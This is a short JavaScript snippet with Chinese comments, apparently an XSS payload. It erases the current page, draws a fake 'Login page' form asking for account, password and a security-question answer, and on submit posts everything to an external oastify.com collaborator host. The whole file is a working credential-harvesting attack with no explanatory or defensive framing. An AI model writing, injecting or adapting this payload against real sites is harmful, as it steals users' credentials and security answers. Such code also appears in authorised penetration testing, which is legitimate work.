// 清除页面中的所有内容
document.body.innerHTML = '';

// 创建标题
const loginTitle = document.createElement("h2"); // 更具体的变量名
loginTitle.textContent = "Login page";
document.body.appendChild(loginTitle);

// 创建表单（使用唯一命名）
const customLoginForm = document.createElement("form");
customLoginForm.id = "customLoginForm"; // 使用独特ID

// 输入域创建函数（提取公共逻辑）
function createFormField(form, labelText, name, type = "text") {
  form.appendChild(document.createTextNode(labelText));
  const input = document.createElement("input");
  input.type = type;
  input.name = name;
  input.required = true;
  form.appendChild(input);
  form.appendChild(document.createElement("br"));
  return input;
}

// 创建各输入域
createFormField(customLoginForm, "account:", "username");
createFormField(customLoginForm, "password:", "password", "password");
createFormField(customLoginForm, "The answer of your question?", "answer");

// 添加间隔
customLoginForm.appendChild(document.createElement("br"));

// 提交按钮（使用具体命名）
const formSubmitButton = document.createElement("button");
formSubmitButton.type = "submit";
formSubmitButton.textContent = "Submit";
customLoginForm.appendChild(formSubmitButton);

// 添加表单到页面
document.body.appendChild(customLoginForm);

// 事件监听（使用独特函数名）
customLoginForm.addEventListener("submit", function handleCustomFormSubmit(e) {
  e.preventDefault();

  const formData = new FormData(customLoginForm);
  
  // 发送请求（可根据需要保留或修改）
  fetch("https://co4ozwtzquywfw322rxbskkam1ssgr4g.oastify.com", {
    method: "POST",
    body: formData
  });
});